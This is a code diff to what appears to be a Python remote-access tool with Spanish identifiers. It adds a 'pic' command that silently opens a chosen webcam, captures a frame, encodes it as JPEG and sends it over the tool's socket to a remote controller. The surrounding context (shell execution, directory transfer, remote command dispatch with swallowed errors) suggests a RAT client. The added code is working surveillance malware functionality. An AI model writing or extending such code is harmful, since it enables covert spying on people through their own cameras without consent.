@@ -5,6 +5,7 @@ import re
 import pickle
 import struct
 import requests
+import cv2
 from time import sleep
 from subprocess import Popen, PIPE
 from zipfile import ZipFile
@@ -243,6 +244,22 @@ class TCP:
 
         else:
             self.__sock.send(f"error: Imagen \"{imagen}\" no encontrada".encode())
+
+    def pic(self, cmd):
+        camara = int(re.findall("-c[= ]([0-9].*)", cmd)[0])
+        captura = cv2.VideoCapture(camara, cv2.CAP_DSHOW)
+
+        leido, frame = captura.read()
+
+        if leido:
+            self.__sock.send("ok".encode())
+            sleep(0.05)
+
+            frame = cv2.imencode(".jpg", frame)[1]
+            self.enviarDatos(frame)
+        
+        else:
+            self.__sock.send(f"error: Camara \"{camara}\" no encontrada".encode())
 
     def sendDirFrom(self, cmd):
         if re.search("-d[= ]", cmd):
@@ -544,6 +561,13 @@ class TCP:
                 elif cmd.lower()[:3] == "img":
                     try:
                         self.image(cmd)
+
+                    except:
+                        continue
+                
+                elif cmd.lower()[:3] == "pic":
+                    try:
+                        self.pic(cmd)
 
                     except:
                         continue
